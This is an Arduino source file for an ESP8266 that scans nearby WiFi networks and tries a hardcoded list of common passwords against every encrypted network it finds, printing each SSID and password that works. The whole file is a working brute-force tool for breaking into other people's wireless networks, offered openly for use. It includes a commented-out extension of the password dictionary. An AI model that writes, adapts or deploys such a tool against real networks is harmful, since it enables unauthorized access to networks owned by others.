
#include "ESP8266WiFi.h"

#define ARRAYSIZE 5
String pass[ARRAYSIZE] = {"12345678", "1234512345", "123456789", "watermelon", "1234567890"}; //, "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "696969", "shadow", "master", "666666"};
void setup(void)
{
  Serial.begin(115200);
  while (!Serial)
  {
    ; // wait for serial port to connect. Needed for native USB port only
  }
  for (int i = 0; i < ARRAYSIZE; i++)
  {
    Serial.print("value ");
    Serial.print(i);
    Serial.print(" is ");
    Serial.println(pass[i]);
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("Setup done");
}

void loop()
{
  Serial.println("scan start");

  // WiFi.scanNetworks will return the number of networks found
  int n = WiFi.scanNetworks();
  Serial.println("scan done");
  if (n == 0)
    Serial.println("no networks found");
  else
  {
    Serial.print(n);
    Serial.println(" networks found");
    for (int i = 0; i < n; ++i)
    {
      if (WiFi.encryptionType(i) != ENC_TYPE_NONE)
      {
        butforceWifi((const char *)WiFi.SSID(i).c_str());
      }
    }

    delay(5000);
  }
}

//
void butforceWifi(const char* ssid)
{
  Serial.println(ssid);
  for (int j = 0; j < ARRAYSIZE; ++j)
  {
    WiFi.begin(ssid, pass[j]);
    for (int t = 0; t < 3; t++)
    {
      //Serial.print(j);
      //Serial.print(". ");
      //Serial.println(pass[j]);
      while (WiFi.status() == WL_DISCONNECTED)
      {
        delay(1000);
        if (WiFi.status() != WL_CONNECTED)
        {
          Serial.print(".");
        }
        else
        {
          printResult(ssid, (const char *)pass[j].c_str());
        }
      }
     
    }
    Serial.println("");
  }
}

void printResult(const char *ssid, const char *pass)
{
  Serial.println("");
  Serial.print("SSID is ");
  Serial.print(ssid);
  Serial.print(" password is ");
  Serial.println(pass);
  WiFi.disconnect();
}
